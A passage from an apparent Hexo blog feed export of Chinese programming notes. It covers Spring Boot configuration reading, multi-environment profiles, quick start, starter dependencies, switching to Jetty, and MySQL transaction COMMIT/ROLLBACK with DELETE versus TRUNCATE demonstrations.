<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;value&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> val1;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;boolean.value&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Boolean val2;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;string.value1&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String val3;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;string.value2&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String val4;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;null.value&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Object val5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="2-Environment对象获取全部配置信息"><a href="#2-Environment对象获取全部配置信息" class="headerlink" title="2. Environment对象获取全部配置信息"></a>2. Environment对象获取全部配置信息</h3><p><strong>将yaml文件中的全部信息交给 <code>Environment</code> 对象</strong></p>
<p><strong>示例代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取所有 yaml 的变量</span></span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> Environment environment;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getById</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;envir:&quot;</span>  + environment.getProperty(<span class="string">&quot;value&quot;</span>)); <span class="comment">// 666</span></span><br><span class="line">		System.out.println(<span class="string">&quot;envir:&quot;</span>  + environment.getProperty(<span class="string">&quot;enterprise.subject[0]&quot;</span>)); <span class="comment">// Java</span></span><br><span class="line">		System.out.println(<span class="string">&quot;envir:&quot;</span>  + environment.getProperty(<span class="string">&quot;enterprise.subject[1]&quot;</span>)); <span class="comment">// 前端</span></span><br><span class="line">		System.out.println(<span class="string">&quot;envir:&quot;</span>  + environment.getProperty(<span class="string">&quot;enterprise.subject[2]&quot;</span>)); <span class="comment">// 大数据 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;hello, springBoot&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-实体类获取配置信息"><a href="#3-实体类获取配置信息" class="headerlink" title="3. 实体类获取配置信息"></a>3. 实体类获取配置信息</h3><p><strong>首先需要创建一个匹配配置文件中对象的类，并且读取配置文件中的对象<code>不能</code>使用 <code>@Value</code> 注解，而需要使用 <code>@ConfigurationProperties</code> 注解，该注解放在创建的类上，并且有一个 <code>prefix</code> 属性用于设置配置文件中对应的 <code>key</code>。创建的类中必须要有 <code>Setter</code> 和 <code>Getter</code> 方法。</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815153920.png"></p>
<p><strong>在此 yaml 文件中，有配置对象 enterpries，因此我创建一个匹配该对象的类。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;enterprise&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Enterprise</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">private</span> Integer age;</span><br><span class="line">	<span class="keyword">private</span> String tel;</span><br><span class="line">	<span class="keyword">private</span> String[] subject;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Enterprise&#123;&quot;</span> +</span><br><span class="line">				<span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">				<span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">				<span class="string">&quot;, tel=&#x27;&quot;</span> + tel + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">				<span class="string">&quot;, subject=&quot;</span> + Arrays.toString(subject) +</span><br><span class="line">				<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> age;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getTel</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> tel;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTel</span><span class="params">(String tel)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.tel = tel;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> String[] getSubject() &#123;</span><br><span class="line">		<span class="keyword">return</span> subject;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSubject</span><span class="params">(String[] subject)</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.subject = subject;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过创建的类读取到配置文件的对象后，将该类注册到 Spring 容器中，当使用时，直接通过 <code>@Autowired</code> 或者 <code>@Resource</code> 注解注入就好。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> Enterprise enterprise;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">getById</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Enter:&quot;</span> + enterprise);</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;hello, springBoot&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="4-多环境开发配置"><a href="#4-多环境开发配置" class="headerlink" title="4. 多环境开发配置"></a>4. 多环境开发配置</h2><ul>
<li><strong>在 yaml 中，各环境之间 以 <code>---</code> 相隔</strong><br><strong>示例代码：</strong></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置启用的环境</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># 开发环境</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># 生产环境</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">pro</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">81</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># 测试环境</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">test</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">82</span></span><br></pre></td></tr></table></figure>



<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 其中</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span> <span class="string">dev</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 可以替换为</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">config:</span></span><br><span class="line">    <span class="attr">activate:</span></span><br><span class="line">      <span class="attr">on-profile:</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure>

<h1 id="四、properties-和-yaml-的总结"><a href="#四、properties-和-yaml-的总结" class="headerlink" title="四、properties 和 yaml 的总结"></a>四、properties 和 yaml 的总结</h1><ul>
<li><strong>properties与yaml语法结构</strong></li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>properties</th>
<th>yaml或yml</th>
</tr>
</thead>
<tbody><tr>
<td>语法结构</td>
<td><code>key=value</code></td>
<td><code>key: value</code>（:和value之间需要空格）</td>
</tr>
</tbody></table>
<ul>
<li><strong>properties 为早期并且默认的配置⽂件格式，但其配置存在⼀定的冗余数据，使⽤ yaml 可以很好的 解决数据冗余的问题</strong></li>
<li><strong>yaml 通⽤性更好，⽀持更多语⾔，如 Java、Go、Python 等，如果是云服务器开发，可以使⽤⼀份配置⽂件作为 Java 和 Go 的共同配置⽂件</strong></li>
<li><strong>yaml 虽然可以和 properties 共存，但⼀个项⽬中建议使⽤统⼀的配置类型⽂件</strong></li>
<li><strong>yaml 支持更多的数据类型</strong></li>
<li><strong>运行优先级： properties &gt; yml &gt; yaml</strong></li>
</ul>
<h1 id="自定义对象封装数据警告解决方案"><a href="#自定义对象封装数据警告解决方案" class="headerlink" title="自定义对象封装数据警告解决方案"></a>自定义对象封装数据警告解决方案</h1><p><strong>导入以下坐标</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot快速入门</title>
    <url>/posts/dcd9e6db.html</url>
    <content><![CDATA[<h1 id="SpringBoot简介"><a href="#SpringBoot简介" class="headerlink" title="SpringBoot简介"></a>SpringBoot简介</h1><ul>
<li><p><strong>SpringBoot是Pivotal团队提供的全新框架，其设计目的是用来<code>简化</code>Spring应用的<code>初始搭建</code>以及<code>开发过程</code></strong></p>
</li>
<li><p><strong>Spring程序缺点</strong><br>① 配置繁琐<br>② 依赖设置繁琐</p>
</li>
<li><p><strong>SpringBoot程序优点</strong><br>① 自动配置<br>② 起步依赖（简化依赖配置）<br>③ 辅助功能（内置服务器…）</p>
</li>
</ul>
<h1 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h1><p><strong>① 创建新模块，选则 <code>Spring Initializr</code>，并配置模块相关基础信息</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154200.png"></p>
<hr>
<p><strong>② 选择当前模块需要使用的技术集</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154200.png"></p>
<hr>
<p><strong>③ 开发控制器类</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154200.png"></p>
<hr>
<p><strong>④ 运行自动生成的 Application 类</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154200.png"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154200.png"></p>
<hr>
<ul>
<li><strong>Spring程序与SpringBoot程序对比</strong></li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154200.png"></p>
<hr>
<p><strong><code>注意</code>：基于Idea开发SpringBoot程序需要确保联网且能够加载到程序框架结构</strong></p>
<h1 id="SpringBoot程序快速启动"><a href="#SpringBoot程序快速启动" class="headerlink" title="SpringBoot程序快速启动"></a>SpringBoot程序快速启动</h1><p><strong>① 将整个工程打包</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154200.png"><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154200.png"></p>
<p><strong>② 到 jar 包所在目录打开终端，输入命令：<code>java -jar jar包名字</code></strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154200.png"></p>
<p><strong>程序启动成功：</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154200.png"></p>
<blockquote>
<p><strong><code>注意</code>：jar 支持命令行启动需要依赖 Maven 插件，请确认打包是是否具有SpringBoot对应的Maven 插件</strong><br><br><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154201.png"></p>
</blockquote>
<hr>
<h1 id="SpringBoot起步依赖"><a href="#SpringBoot起步依赖" class="headerlink" title="SpringBoot起步依赖"></a>SpringBoot起步依赖</h1><p><strong>在SpringBoot项目的 pom.xml 中继承了 <code>spring-boot-starter-parent</code>，而在 <code>spring-boot-starter-parent</code> 中又继承了 <code>spring-boot-dependencies</code>。</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154201.png"></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154201.png"></p>
<p><strong><code>spring-boot-dependencies</code>中定义了若干可选依赖，因此SpringBoot在使用仅书写G与A即可，V由SpringBoot提供</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154201.png"></p>
<ul>
<li><p><strong>starter</strong><br>SpringBoot中常见项目名称，定义了当前项目使用的所有项目坐标，以达到减少依赖配置的目的</p>
</li>
<li><p><strong>parent</strong><br>  所有SpringBoot项目要继承的项目，定义了若干个坐标版本号（依赖管理，而非依赖），以达到减少依赖冲突的目的</p>
</li>
<li><p><strong>实际开发</strong><br>使用任意坐标时，仅书写GAV的G与A，V由SpringBoot提供<br>如发生坐标错误，再指定version（小心版本冲突）</p>
</li>
</ul>
<h1 id="更改SpringBoot服务器为Jetty"><a href="#更改SpringBoot服务器为Jetty" class="headerlink" title="更改SpringBoot服务器为Jetty"></a>更改SpringBoot服务器为Jetty</h1><blockquote>
<p><strong>Jetty 比 Tomcat 更轻量级，可拓展性强（相较于Tomcat），谷歌应用引擎（GAE）已全面切换为 Jetty</strong></p>
</blockquote>
<p><strong>① 在导入 <code>spring-boot-starter-web</code> 模块时使用排除依赖，排除掉 Tomcat 服务器</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154201.png"></p>
<p><strong>② 导入 jetty 服务器坐标</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jetty<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>DCL中COMMIT与ROLLBACK的使用</title>
    <url>/posts/b873a1b0.html</url>
    <content><![CDATA[<h1 id="DCL中-COMMIT-与-ROLLBACK"><a href="#DCL中-COMMIT-与-ROLLBACK" class="headerlink" title="DCL中 COMMIT 与 ROLLBACK"></a>DCL中 COMMIT 与 ROLLBACK</h1><h2 id="COMMIT：提交数据"><a href="#COMMIT：提交数据" class="headerlink" title="COMMIT：提交数据"></a>COMMIT：提交数据</h2><ul>
<li>提交事务，一旦执行<code>COMMIT</code>，则数据就被永久的保存在了数据库中，意味着数据不可以回滚。</li>
</ul>
<h2 id="ROLLBACK：回滚数据"><a href="#ROLLBACK：回滚数据" class="headerlink" title="ROLLBACK：回滚数据"></a>ROLLBACK：回滚数据</h2><ul>
<li>一旦执行<code>ROLLBACK</code>,则可以实现数据的回滚。回滚到&#x3D;&#x3D;最近的一次&#x3D;&#x3D;<code>COMMIT</code>之后。</li>
</ul>
<h1 id="DDL-和-DML-的说明"><a href="#DDL-和-DML-的说明" class="headerlink" title="DDL 和 DML 的说明"></a>DDL 和 DML 的说明</h1><ul>
<li><p>DDL的操作一旦执行，就不可回滚。指令<code>SET autocommit = FALSE</code>对DDL操作失效。(因为在执行完DDL操作之后，一定会执行一次COMMIT。而此COMMIT操作不受<code>SET autocommit = FALSE</code>影响的。)</p>
</li>
<li><p>DML的操作默认情况，一旦执行，也是不可回滚的。但是，如果在执行DML之前，执行了 <code>SET autocommit = FALSE</code>，则执行的DML操作就可以实现回滚。</p>
</li>
</ul>
<blockquote>
<ul>
<li>DDL一定是自动提交即自动保存</li>
<li>DML默认自动提交，但我们可以通过设置 <code>SET autocommit = FALSE</code>来让DML操作不自动提交即可实现回滚</li>
</ul>
</blockquote>
<h1 id="SQL中事务的操作"><a href="#SQL中事务的操作" class="headerlink" title="SQL中事务的操作"></a>SQL中事务的操作</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 开启事务</span><br><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"></span><br><span class="line"># 提交事务</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"># 查看事务默认提交方式  <span class="number">1</span> <span class="operator">-</span><span class="operator">&gt;</span> 自动提交; <span class="number">0</span> <span class="operator">-</span><span class="operator">&gt;</span> 手动提交</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@autocommit</span>;</span><br><span class="line"></span><br><span class="line"># 设置提交方式为自动提交</span><br><span class="line"><span class="keyword">SET</span> autocommit <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">SET</span> autocommit <span class="operator">=</span> <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line"># 设置提交方式为手动提交（要实现上述所谈回滚，必须更改为手动提交）</span><br><span class="line"><span class="keyword">SET</span> autocommit <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">SET</span> autocommit <span class="operator">=</span> <span class="literal">FALSE</span>;</span><br><span class="line"></span><br><span class="line"># 回滚事务</span><br><span class="line"><span class="keyword">ROLLBACK</span>;</span><br></pre></td></tr></table></figure>

<h1 id="对比-TRUNCATE-TABLE-和-DELETE-FROM"><a href="#对比-TRUNCATE-TABLE-和-DELETE-FROM" class="headerlink" title="对比 TRUNCATE TABLE 和 DELETE FROM"></a>对比 TRUNCATE TABLE 和 DELETE FROM</h1><ul>
<li>相同点：<ul>
<li>都可以实现对表中所有数据的删除，同时保留表结构。</li>
</ul>
</li>
<li>不同点：<ul>
<li>TRUNCATE TABLE：一旦执行此操作，表数据全部清除。同时，数据是不可以回滚的。</li>
<li>DELETE FROM：一旦执行此操作，表数据可以全部清除（不带WHERE）。同时，数据是可以实现回滚的。</li>
</ul>
</li>
</ul>
<h1 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h1><p><strong>演示 DELETE FROM</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 演示：<span class="keyword">DELETE</span> <span class="keyword">FROM</span></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">1</span>) 查询初始状态</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> myemp3;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-----------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> emp_id <span class="operator">|</span> lname     <span class="operator">|</span> department_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-----------+-----------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">200</span> <span class="operator">|</span> Whalen    <span class="operator">|</span> Administration  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">201</span> <span class="operator">|</span> Hartstein <span class="operator">|</span> Marketing       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">202</span> <span class="operator">|</span> Fay       <span class="operator">|</span> Marketing       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-----------+-----------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">2</span>) 设置不自动提交</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> autocommit <span class="operator">=</span> <span class="literal">FALSE</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">3</span>) 删除表中数据</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">DELETE</span> <span class="keyword">FROM</span> myemp3;</span><br><span class="line">Query OK, <span class="number">3</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">4</span>) 再次查询数据，现在应该为空</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> myemp3;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">5</span>) 回滚事务，即撤销刚才的删除操作</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ROLLBACK</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.19</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">6</span>) 再次查询数据，与初始状态相同</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> myemp3;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-----------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> emp_id <span class="operator">|</span> lname     <span class="operator">|</span> department_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-----------+-----------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">200</span> <span class="operator">|</span> Whalen    <span class="operator">|</span> Administration  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">201</span> <span class="operator">|</span> Hartstein <span class="operator">|</span> Marketing       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">202</span> <span class="operator">|</span> Fay       <span class="operator">|</span> Marketing       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-----------+-----------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<p><strong>演示 TRUNCATE TABLE</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 演示：<span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">1</span>) 查询初始状态</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> myemp3;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-----------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> emp_id <span class="operator">|</span> lname     <span class="operator">|</span> department_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-----------+-----------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">200</span> <span class="operator">|</span> Whalen    <span class="operator">|</span> Administration  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">201</span> <span class="operator">|</span> Hartstein <span class="operator">|</span> Marketing       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">202</span> <span class="operator">|</span> Fay       <span class="operator">|</span> Marketing       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-----------+-----------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">2</span>) 设置不自动提交</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SET</span> autocommit <span class="operator">=</span> <span class="literal">FALSE</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">3</span>) 删除表中数据</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span> myemp3;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.26</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">4</span>) 再次查询数据，现在应该为空</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> myemp3;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">5</span>) 回滚事务，无效</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">ROLLBACK</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> #<span class="number">6</span>) 再次查询数据，仍然为空</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> myemp3;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring整合Junit</title>
    <url>/posts/ee40a19d.html</url>
